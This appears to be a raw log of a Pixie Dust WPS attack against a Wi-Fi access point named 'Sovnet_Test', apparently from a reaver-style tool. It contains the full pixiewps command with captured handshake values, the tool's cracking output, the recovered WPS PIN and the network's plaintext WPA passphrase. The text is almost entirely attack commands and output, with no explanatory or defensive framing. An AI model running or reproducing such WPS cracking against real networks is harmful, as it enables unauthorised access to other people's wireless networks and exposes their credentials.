[+] Switching radio0mon to channel 11
[+] Waiting for beacon from 1C:61:B4:34:BE:8E
[+] Received beacon from 1C:61:B4:34:BE:8E
[+] Vendor: RalinkTe
[+] Sending identity response
[+] Received identity request
[+] Sending identity response
[+] Received identity request
[+] Sending identity response
[+] Received identity request
[+] Sending identity response
[+] Received identity request
[+] Sending identity response
[+] Received identity request
[+] Sending identity response
executing pixiewps -e b7aaa333e55121a20538109e565e115efcb1c835f6943e732144e6f51324c74cb80d5a735305596bc1ced66ae0203adf95f0f7bdb895ca85f52376844e4f768f2a82e6cf86a367587864d519201a6ac0b03c819bd8feca2c2e1dce0ef5ecbbd6db322853581103e72183f3809041a399d8428cc1df3d835aa92b7234d876e999fb75222452d3d33e98fd7458f2dbe664f5676ef0eb152d6b104a1733ec9ebf15780f198c8121bfff226777bd644bb0f2d29691f5228d6c63fba4f90e0ff57871 -s bf68da3b91ec1c965e872411dc773b2c1fd6c48a1e6ea5445aa5b6a5978f4bb5 -z 5d569b2b9a1275957b350ed89f616bb1439272fa42e73441dd4a21d64b9d3718 -a 557f319a30465bebb0ee700b6471d8a29c5c012176e36dd32b1bd5bfc0c5b7eb -n 7b6d3396296b0dc1ee5a7b7b3ca8ed38 -r 2b8a69be5f93eecc482febea13d22616567eb86339157a099c48533ea22a79abab0ffbded02aa31b98abfad22ca3f100c3ec194271637f5089cdded8c9ec506907676b18af01616c04be277237927820afb0db7571ca4ce8d6a257453bab46242f39dcba515a5ed99cbef24782734368fbec7f43ce0deb0d6bf77530164db10a4aed420cecd386124d41c464c9cd6cc91453dd0b05d0006f319e4cf1a7392f14296ae9a678c76a11801b6b44da9d94d5c214e392e4c779beb8abffb450e2e99f

 Pixiewps 1.4

 [?] Mode:     1 (RT/MT/CL)
 [*] Seed N1:  0xf281da7a
 [*] Seed ES1: 0x8e539c9c
 [*] Seed ES2: 0x64c871e3
 [*] PSK1:     dc686f84528b57e016fa488ae2443681
 [*] PSK2:     23e97bdb810da2e41b4a84fbd8765bef
 [*] ES1:      221b76655e2955520e36be55a57a0ee2
 [*] ES2:      be1fa9a2803453afd8f6b188b63680c5
 [+] WPS pin:  15913807

 [*] Time taken: 0 s 55 ms

[+] Pixiewps: success: setting pin to 15913807
[+] Received M3 message
[+] Sending M4 message
[+] Received M3 message
[+] Received M3 message
[+] Received M3 message
[+] Received M3 message
[+] Received M3 message
[+] Received M3 message
[+] Received M3 message
[+] Received M3 message
[+] Received M3 message
[+] Received M3 message
[+] Received M3 message
[+] Received M3 message
[+] Received M3 message
[+] Received M3 message
[+] Received M3 message
[+] Received M3 message
[+] Received M3 message
[+] Received M3 message
[+] Received M3 message
[+] Received M3 message
[+] Received M3 message
[+] Received M3 message
[+] Received M3 message
[+] Received M3 message
[+] Received M3 message
[+] Received M3 message
[+] Received M5 message
[+] Sending M6 message
[+] Received M5 message
[+] Received M5 message
[+] Received M5 message
[+] Received M5 message
[+] Received M5 message
[+] Received M5 message
[+] Received M5 message
[+] Received M5 message
[+] Received M5 message
[+] Received M5 message
[+] Received M5 message
[+] Received M5 message
[+] Received M5 message
[+] Received M5 message
[+] Received M5 message
[+] Received M5 message
[+] Received M5 message
[+] Received M5 message
[+] Received M5 message
[+] Received M5 message
[+] Received M5 message
[+] Received M5 message
[+] Received M5 message
[+] Received M5 message
[+] Received M7 message
[+] Sending WSC NACK
[+] Sending WSC NACK
[+] Updated P1 array
[+] Updated P2 array
[+] Quitting after pixiewps attack
[+] Pin cracked in 4 seconds
[+] WPS PIN: '15913807'
[+] WPA PSK: '79117771239'
[+] AP SSID: 'Sovnet_Test'
